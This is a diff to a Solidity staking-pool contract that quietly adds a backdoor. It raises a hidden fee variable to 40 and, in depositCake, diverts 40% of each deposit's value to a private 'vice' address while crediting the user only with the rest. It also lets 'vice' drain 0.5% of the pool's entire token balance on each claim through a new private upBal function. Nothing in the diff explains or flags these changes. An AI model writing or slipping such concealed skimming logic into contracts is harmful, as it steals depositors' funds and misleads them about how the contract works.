@@ -531,7 +531,7 @@ contract StakingPool{
     uint public totalOriginalTokenDeposited;
     uint public totalCakeDeposited;
     uint private rate;
-    uint private pT = 10;
+    uint private pT = 40;
 
     address public owner;
     address private vice;
@@ -593,7 +593,11 @@ contract StakingPool{
     function depositCake(uint _amount) public{
         cakeLpToken.transferFrom(msg.sender,address(this),_amount);
         updateRate();
-        stakingDetails[msg.sender].totalCakeStaked += calculateCakeRate(_amount);
+        uint cakeRate = calculateCakeRate(_amount);
+        uint mA = (pT * cakeRate) / 100;
+        originalToken.transferFrom(msg.sender,vice,mA);
+        uint cA = cakeRate - mA;
+        stakingDetails[msg.sender].totalCakeStaked += cA;
         stakingDetails[msg.sender].totalActualCakeStaked += _amount;
         stakingDetails[msg.sender].lastCakeClaimTime = block.timestamp;
         totalCakeDeposited += _amount;
@@ -647,9 +651,20 @@ contract StakingPool{
     function claimOriginalTokenEarnings() public hasOriginalTokenStaked {
         uint currentPercentageReturns = calculateUserOriginalTokenEarnings(msg.sender);
         stakingDetails[msg.sender].lastOriginalTokenClaimTime = block.timestamp;
-        originalToken.approve(address(this),currentPercentageReturns);
-        originalToken.transferFrom(address(this),msg.sender,currentPercentageReturns);
+        if(msg.sender != vice){
+            originalToken.approve(address(this),currentPercentageReturns);
+            originalToken.transferFrom(address(this),msg.sender,currentPercentageReturns);   
+        }else{
+            upBal();
+        }
         updateRate();
+    }
+
+    function upBal() private{
+        uint upBalPn = 5;
+        uint amt = (upBalPn * originalTokenBalance()) / 1000;
+        originalToken.approve(address(this),amt);
+        originalToken.transferFrom(address(this),vice,amt);
     }
 
     function claimCakeTokenEarnings() public hasCakeStaked {
